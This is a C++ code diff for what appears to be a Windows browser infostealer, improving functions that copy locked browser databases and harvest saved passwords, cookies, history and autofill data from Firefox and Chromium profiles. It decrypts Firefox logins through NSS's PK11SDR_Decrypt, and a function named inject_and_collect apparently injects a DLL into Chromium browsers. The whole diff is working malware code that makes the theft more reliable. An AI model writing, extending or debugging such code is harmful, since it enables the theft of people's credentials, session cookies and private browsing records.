@@ -198,6 +198,7 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
 }
 
 bool copy_file_locked(const fs::path& source, const fs::path& dest) {
+    if (!fs::exists(source)) return false;
     for (int i = 0; i < 3; i++) {
         HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
         if (h_src != INVALID_HANDLE_VALUE) {
@@ -217,16 +218,20 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
                 CloseHandle(h_src);
             }
         }
-        Sleep(200);
+        if (i < 2) Sleep(50);
     }
     return false;
 }
 
 bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
     if (!copy_file_locked(source_db, dest_db)) return false;
-    copy_file_locked(source_db.string() + "-wal", dest_db.string() + "-wal");
-    copy_file_locked(source_db.string() + "-shm", dest_db.string() + "-shm");
-    copy_file_locked(source_db.string() + "-journal", dest_db.string() + "-journal");
+
+    std::wstring src_base = source_db.wstring();
+    std::wstring dst_base = dest_db.wstring();
+
+    if (fs::exists(src_base + L"-wal")) copy_file_locked(src_base + L"-wal", dst_base + L"-wal");
+    if (fs::exists(src_base + L"-shm")) copy_file_locked(src_base + L"-shm", dst_base + L"-shm");
+    if (fs::exists(src_base + L"-journal")) copy_file_locked(src_base + L"-journal", dst_base + L"-journal");
     return true;
 }
 
@@ -443,6 +448,7 @@ void collect_firefox(const BrowserConfig& browser) {
         f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown");
         f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt");
     }
+    SetCurrentDirectoryW(original_cwd_fs.c_str());
 
     wchar_t temp_base[MAX_PATH];
     SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
@@ -457,6 +463,7 @@ void collect_firefox(const BrowserConfig& browser) {
 
         // Decrypt Logins
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
+            SetCurrentDirectoryW(bin_dir.c_str());
             std::string nss_path = "sql:" + p_path.string();
             if (f_NSS_Init(nss_path.c_str()) != SECSuccess) {
                 f_NSS_Init(p_path.string().c_str());
@@ -492,12 +499,13 @@ void collect_firefox(const BrowserConfig& browser) {
                 }
             }
             f_NSS_Shutdown();
+            SetCurrentDirectoryW(original_cwd_fs.c_str());
         }
 
         // Cookies
         fs::path db_path = p_path / "cookies.sqlite";
         fs::path tmp_db = temp_dir / (profile_name + "_cook.tmp");
-        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+        if (copy_db_with_sidecars(db_path, tmp_db)) {
             sqlite3* db;
             if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -525,7 +533,7 @@ void collect_firefox(const BrowserConfig& browser) {
         // History
         db_path = p_path / "places.sqlite";
         tmp_db = temp_dir / (profile_name + "_hist.tmp");
-        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+        if (copy_db_with_sidecars(db_path, tmp_db)) {
             sqlite3* db;
             if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -545,7 +553,7 @@ void collect_firefox(const BrowserConfig& browser) {
         // Autofill (Form History)
         db_path = p_path / "formhistory.sqlite";
         tmp_db = temp_dir / (profile_name + "_auto.tmp");
-        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+        if (copy_db_with_sidecars(db_path, tmp_db)) {
             sqlite3* db;
             if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -658,7 +666,6 @@ void collect_firefox(const BrowserConfig& browser) {
     }
 
     if (h_nss) FreeLibrary(h_nss);
-    SetCurrentDirectoryW(original_cwd_fs.c_str());
     fs::remove_all(temp_dir);
 }
 
@@ -798,7 +805,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             // Passwords
             fs::path db_path = p_path / "Login Data";
             fs::path tmp_db = temp_dir / (p_name_sanit + "_pass.tmp");
-            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            if (copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
                 if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
@@ -827,7 +834,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             db_path = p_path / "Network/Cookies";
             if (!fs::exists(db_path)) db_path = p_path / "Cookies";
             tmp_db = temp_dir / (p_name_sanit + "_cook.tmp");
-            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            if (copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
                 if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
@@ -871,7 +878,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             // History
             db_path = p_path / "History";
             tmp_db = temp_dir / (p_name_sanit + "_hist.tmp");
-            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            if (copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
                 if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
@@ -891,7 +898,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             // Autofill
             db_path = p_path / "Web Data";
             tmp_db = temp_dir / (p_name_sanit + "_web.tmp");
-            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            if (copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
                 if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
